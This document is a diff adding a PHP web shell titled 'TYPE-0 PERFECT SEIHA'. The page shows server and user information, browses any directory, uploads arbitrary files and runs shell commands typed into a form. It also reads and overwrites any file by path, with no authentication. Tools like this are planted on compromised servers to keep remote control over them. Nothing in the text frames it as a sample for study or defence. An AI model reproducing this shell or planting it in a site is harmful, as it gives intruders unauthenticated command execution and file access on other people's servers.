@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TYPE-0 PERFECT SEIHA</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css?family=Dosis');
+        @import url('https://fonts.googleapis.com/css?family=Bungee');
+        @import url('https://fonts.googleapis.com/css?family=Russo+One');
+        body {
+            font-family: "Russo One", cursive;
+            text-shadow: 0px 0px 1px #757575;
+        }
+        .container { max-width: 800px; margin: 20px auto; padding: 20px; border: 1px solid #ccc; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+        .breadcrumb { list-style-type: none; padding: 0; display: flex; flex-wrap: wrap; justify-content: center; }
+        .breadcrumb li { margin-right: 5px; }
+        .breadcrumb a { text-decoration: none; color: blue; }
+        .permission-green { color: green; }
+        .permission-red { color: red; }
+        .current-directory h3 {
+            text-align: center;
+		.home-link { font-size: 18px; margin-bottom: 10px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>TYPE-0 PERFECT SEIHA</h2>
+        
+        <?php
+        echo '<h3>Server Info:</h3>';
+        echo '<pre>' . shell_exec('uname -a') . '</pre>';
+        echo '<h3>User Info:</h3>';
+        echo '<pre>' . shell_exec('id') . '</pre>';
+        echo '<h3>Server Software:</h3>';
+        if (strpos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false) {
+            echo '<pre>LiteSpeed</pre>';
+        } elseif (strpos($_SERVER['SERVER_SOFTWARE'], 'Apache') !== false) {
+            echo '<pre>Apache</pre>';
+        } else {
+            echo '<pre>' . $_SERVER['SERVER_SOFTWARE'] . '</pre>';
+        }
+
+        function listFiles($dir) {
+            $folders = [];
+            $files = [];
+            if (is_dir($dir)) {
+                if ($dh = opendir($dir)) {
+                    while (($file = readdir($dh)) !== false) {
+                        if ($file != '.' && $file != '..') {
+                            $filePath = $dir . '/' . $file;
+                            $fileInfo = stat($filePath);
+                            $permissions = substr(sprintf('%o', fileperms($filePath)), -4);
+                            $lastModified = date('Y-m-d H:i:s', $fileInfo['mtime']);
+                            $userGroup = posix_getpwuid($fileInfo['uid'])['name'] . '/' . posix_getgrgid($fileInfo['gid'])['name'];
+                            $size = is_dir($filePath) ? '-' : filesize($filePath);
+
+                            $permissionClass = is_writable($filePath) ? 'permission-green' : 'permission-red';
+
+                            $fileData = [
+                                'name' => $file,
+                                'size' => $size,
+                                'permissions' => $permissions,
+                                'lastModified' => $lastModified,
+                                'userGroup' => $userGroup,
+                                'path' => $filePath,
+                                'isDir' => is_dir($filePath),
+                                'permissionClass' => $permissionClass
+                            ];
+
+                            if ($fileData['isDir']) {
+                                $folders[] = $fileData;
+                            } else {
+                                $files[] = $fileData;
+                            }
+                        }
+                    }
+                    closedir($dh);
+                }
+            } else {
+                echo '<p>Not a valid directory.</p>';
+            }
+
+            echo '<h3>Folders:</h3>';
+            echo '<table>';
+            echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
+            foreach ($folders as $folder) {
+                echo '<tr>';
+                echo '<td><a href="?dir='.urlencode($folder['path']).'"> '.$folder['name'].'</a></td>';
+                echo '<td>'.$folder['size'].'</td>';
+                echo '<td class="'.$folder['permissionClass'].'">'.$folder['permissions'].'</td>';
+                echo '<td>'.$folder['lastModified'].'</td>';
+                echo '<td>'.$folder['userGroup'].'</td>';
+                echo '</tr>';
+            }
+            echo '</table>';
+
+            echo '<h3>Files:</h3>';
+            echo '<table>';
+            echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
+            foreach ($files as $file) {
+                echo '<tr>';
+                echo '<td><a href="?edit='.urlencode($file['path']).'"> '.$file['name'].'</a></td>';
+                echo '<td>'.$file['size'].'</td>';
+                echo '<td class="'.$file['permissionClass'].'">'.$file['permissions'].'</td>';
+                echo '<td>'.$file['lastModified'].'</td>';
+                echo '<td>'.$file['userGroup'].'</td>';
+                echo '</tr>';
+            }
+            echo '</table>';
+        }
+
+        $currentDir = getcwd();
+
+        if (isset($_GET['dir'])) {
+            $newDir = $_GET['dir'];
+            if (is_dir($newDir)) {
+                $currentDir = realpath($newDir);
+            }
+        }
+
+        chdir($currentDir);
+
+        // Aploder
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
+            $uploadDir = $currentDir . '/';
+            $uploadFile = $uploadDir . basename($_FILES['file']['name']);
+            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
+                echo '<p>File uploaded successfully.</p>';
+            } else {
+                echo '<p>Failed to upload file.</p>';
+            }
+        }
+
+        // Komeng
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
+            $command = $_POST['command'];
+            if ($command) {
+                echo '<h3>Command Output:</h3>';
+                echo '<pre>';
+                echo shell_exec(escapeshellcmd($command));
+                echo '</pre>';
+            }
+        }
+
+        // Edit
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save'])) {
+            $fileToSave = $_POST['filename'];
+            $content = $_POST['content'];
+            file_put_contents($fileToSave, $content);
+            echo '<p>File saved successfully.</p>';
+        }
+
+        // Krit dir
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_dir'])) {
+            $newDir = $_POST['new_dir'];
+            if ($newDir) {
+                $newDirPath = $currentDir . '/' . $newDir;
+                if (!is_dir($newDirPath)) {
+                    mkdir($newDirPath);
+                    echo '<p>Directory created successfully.</p>';
+                } else {
+                    echo '<p>Directory already exists.</p>';
+                }
+            }
+        }
+
+        // Krit file
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_file'])) {
+            $newFile = $_POST['new_file'];
+            if ($newFile) {
+                $newFilePath = $currentDir . '/' . $newFile;
+                if (!file_exists($newFilePath)) {
+                    file_put_contents($newFilePath, '');
+                    echo '<p>File created successfully.</p>';
+                } else {
+                    echo '<p>File already exists.</p>';
+                }
+            }
+        }
+
+        function renderBreadcrumb($currentDir) {
+            $pathArray = explode(DIRECTORY_SEPARATOR, $currentDir);
+            echo '<ul class="breadcrumb" style="justify-content:center;">';
+            echo '<li><a href="?">[HOME]</a></li>';
+            foreach ($pathArray as $index => $dir) {
+                if ($dir === '') continue;  
+                $path = implode(DIRECTORY_SEPARATOR, array_slice($pathArray, 0, $index + 1));
+                echo '<li><a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($dir) . '</a></li>';
+                if ($index < count($pathArray) - 1) {
+                    echo '<li>/</li>';
+                }
+            }
+            echo '</ul>';
+        }
+        ?>
+
+        <form method="POST" enctype="multipart/form-data">
+            <input type="file" name="file">
+            <button type="submit">Upload</button>
+        </form>
+
+        <hr>
+
+        <div class="current-directory">
+            <?php renderBreadcrumb($currentDir); ?>
+            <h3>Current Directory:</h3>
+        </div>
+
+        <?php
+        listFiles($currentDir);
+        ?>
+
+        <hr>
+
+        <form method="POST">
+            <h3>Create New Directory:</h3>
+            <input type="text" name="new_dir" placeholder="New Directory Name">
+            <button type="submit">Create Directory</button>
+        </form>
+
+        <form method="POST">
+            <h3>Create New File:</h3>
+            <input type="text" name="new_file" placeholder="New File Name">
+            <button type="submit">Create File</button>
+        </form>
+
+        <hr>
+
+        <form method="POST">
+            <h3>Execute Command:</h3>
+            <input type="text" name="command" placeholder="Command">
+            <button type="submit">Execute</button>
+        </form>
+
+        <?php
+        if (isset($_GET['edit'])) {
+            $fileToEdit = $_GET['edit'];
+            if (is_file($fileToEdit)) {
+                $content = file_get_contents($fileToEdit);
+                echo '<form method="POST">';
+                echo '<h3>Editing File: ' . htmlspecialchars($fileToEdit) . '</h3>';
+                echo '<textarea name="content" rows="20" cols="80">' . htmlspecialchars($content) . '</textarea><br>';
+                echo '<input type="hidden" name="filename" value="' . htmlspecialchars($fileToEdit) . '">';
+                echo '<button type="submit" name="save">Save File</button>';
+                echo '</form>';
+            }
+        }
+        ?>
+    </div>
+</body>
+</html>
